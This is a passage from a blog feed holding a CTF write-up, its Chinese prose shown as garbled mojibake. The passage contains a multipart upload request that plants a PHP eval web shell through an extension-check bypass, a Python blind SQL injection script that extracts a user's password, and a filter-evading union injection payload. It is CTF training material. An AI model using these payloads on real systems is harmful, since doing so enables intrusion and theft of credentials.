<span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">999</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">;</span>        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$new_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'hehe'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string">'@&lt;?php'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">,</span><span class="token variable">$new_name</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$new_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><blockquote><p>ËÄÉÂØü‰∏§‰∏™Áü•ËØÜÁÇπÔºå‰∏Ä‰∏™ÊòØÊï∞ÁªÑÁªïËøáÔºå‰ª•Âèäunlink  <del>php/.</del> ÁªïËøá„ÄÇ</p><p>ÊûÑÈÄ†Êï∞ÊçÆÂåÖÂ¶Ç‰∏ãÔºàÊú¨Âú∞Â§çÁé∞ÔºâÔºö</p><pre class=" language-shell"><code class="language-shell">POST /shawsweb3.php HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: http://127.0.0.1/upload.htmlContent-Type: multipart/form-data; boundary=----------------------------280543779984883401718121Content-Length: 586Connection: closeUpgrade-Insecure-Requests: 1----------------------------280543779984883401718121Content-Disposition: form-data; name="file[0]"php----------------------------280543779984883401718121Content-Disposition: form-data; name="file[a]"php/.----------------------------280543779984883401718121Content-Disposition: form-data; name="hehe"100.php----------------------------280543779984883401718121Content-Disposition: form-data; name="file"; filename="index.php"Content-Type: application/x-httpd-php@<?php    @eval($_GET['cmd']);?>----------------------------280543779984883401718121--</code></pre><p>ÂÜçÈÄöËøáÈÅçÂéÜÊñá‰ª∂ÂêçÊãøÂà∞ÊùÉÈôêÔºågetflag„ÄÇ</p></blockquote><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><blockquote><p>Êó∂Èó¥Áõ≤Ê≥® + Êñá‰ª∂ÂêçÊãºÊé•  + ‰∏ä‰º†Êà™Êñ≠ÁªïËøáÔºå%02ÈªëËÑ∏Êà™Êñ≠üòÑ„ÄÇ</p><p>ÊûÑÈÄ†Âá∫payloadÂêéÂèØ‰ª•Áõ¥Êé•ÊãøÁªôsqlmapË∑ëÔºüÁ•ûÂô®ÔºàÊúâÊó∂Èó¥ÂÜçÊ∑±ÂÖ•Á†îÁ©∂‰∏Ä‰∏ãÔºâ„ÄÇ‰πüÂèØ‰ª•Ëá™Â∑±ÂÜôËÑöÊú¨Ë∑ëÔºå‰æãÂ¶Ç‰∏ãÈù¢Â∞±ÊòØÊàëËÆ§‰∏∫‰∏Ä‰∏™ÂÜôÁöÑÊØîËæÉÁÆÄÂçïÊòìÁî®ÁöÑËÑöÊú¨Ôºö</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> string<span class="token keyword">import</span> requests<span class="token comment" spellcheck="true">#ÈáçÁî®ÊÄßÈ´òÁöÑ‰ª£Á†ÅÊòØÂ•Ω‰ª£Á†Å</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>v <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">def</span> <span class="token function">judge</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> text <span class="token operator">!=</span> <span class="token string">'$content=str_replace($value,"",$content)'</span><span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://dbeffc8ba3a84abebc7ff930c5d6fda460a4bee570ff4211.game.ichunqiu.com/select_guest.php"</span>    <span class="token keyword">return</span> get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">blind_inject</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        left <span class="token operator">=</span> <span class="token number">0</span>        right <span class="token operator">=</span> <span class="token number">128</span>        <span class="token keyword">while</span> left <span class="token operator">&lt;=</span> right<span class="token punctuation">:</span>            mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>            c <span class="token operator">=</span> chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>            payload <span class="token operator">=</span> s<span class="token punctuation">.</span>format<span class="token punctuation">(</span>len<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token operator">+</span>len<span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#print(payload)</span>            <span class="token keyword">if</span> judge<span class="token punctuation">(</span>test<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>                left <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                right <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span>        <span class="token keyword">if</span> left <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span>        r <span class="token operator">+=</span> chr<span class="token punctuation">(</span>left<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>v<span class="token operator">+</span>r<span class="token punctuation">)</span>    <span class="token keyword">return</span> r<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#blind_inject("1%27%20and%20substr(database(),{},1)%20>%20%27{}%27%23")</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true">#blind_inject("1' and substr((SELECT GROUP_CONCAT(table_name) FROM information_schema . tables WHERE table_schema=database()),{},1) > '{}'#")</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true">#blind_inject("1' and substr((SELECT GROUP_CONCAT(column_name) FROM information_schema . columns WHERE table_name = 'user' and table_schema=database()), {},1) > '{}' #")</span>    <span class="token comment" spellcheck="true">#</span>    blind_inject<span class="token punctuation">(</span><span class="token string">"1' and substr((SELECT password FROM web.user where id = 1), {},1) > '{}' #"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>Ë∑ëflagÂç≥ÂèØ„ÄÇ</p><p>emmm‰ª•‰∏äÊòØÁõ≤Ê≥®ÁöÑÊñπÊ≥ïÔºåÈÇ£‰πà‰∏ãÈù¢ËøòÊúâÈÄöËøáfuzzÂæóÂà∞ËøáÊª§ÂÖ≥ÈîÆÂ≠óÔºåÁÑ∂ÂêéÁªïËøáÁõ¥Êé•Ê≥®ÁöÑÔºåÂõ†‰∏∫ËøôÊòØÊúâÂõûÊòæÁöÑ‰∏Ä‰∏™Ê≥®ÂÖ•Âòõ„ÄÇ</p><p><code>id=sd&#39; unifromon selselectect (seselectlect group_concat(username,&#39;:&#39;,password)frfromom web.user),2#</code></p><p>ÊÄª‰πãÊñπÊ≥ïÊÄªÊòØÂ§öÁßçÂ§öÊ†∑ÁöÑ„ÄÇ</p></blockquote><h2 id="Â∞èÁªì"><a href="#Â∞èÁªì" class="headerlink" title="Â∞èÁªì"></a>Â∞èÁªì</h2><blockquote><p>Ëá≥‰∫é‰∫åËøõÂà∂ÔºåËøòÂú®Â≠¶‰π†‰πã‰∏≠ÔºåÂØÜÁ†ÅÂ≠¶ÁöÑRSA,ÂíåAES‰πüÈúÄË¶ÅÊäΩ‰∏™Êó∂Èó¥Êù•Ê∑±ÂÖ•Á†îÁ©∂‰∏Ä‰∏ã„ÄÇ</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;‚Ä¶‚Ä¶&lt;/p&gt;
    
    </summary>
    
      <category term="ÁΩëÁªúÂÆâÂÖ®" scheme="http://www.yof3ng.xyz/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="ÁΩëÁªúÂÆâÂÖ®" scheme="http://www.yof3ng.xyz/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
      <category term="writeup" scheme="http://www.yof3ng.xyz/tags/writeup/"/>
    
  </entry>
  
</feed>
